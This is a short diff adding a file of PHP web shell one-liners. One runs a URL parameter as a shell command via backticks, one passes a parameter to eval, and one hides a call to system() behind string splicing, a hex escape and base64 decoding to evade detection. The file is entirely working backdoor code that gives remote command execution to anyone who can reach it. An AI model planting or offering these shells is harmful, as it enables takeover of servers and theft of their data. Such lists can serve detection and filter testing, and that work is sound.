@@ -1,0 +1,5 @@
+# php
+<?=`$_GET[0]`;;?>
+<?php function r($a){eval($a);}r($_GET[1]);?>
+<?php function/**/r($a){@str_replace("cas","t",'sy'."\x73c".bASe64_deCOde('YXNlbQ=='))($a);}r($_GET[(1)==(89-88)]);?>
+
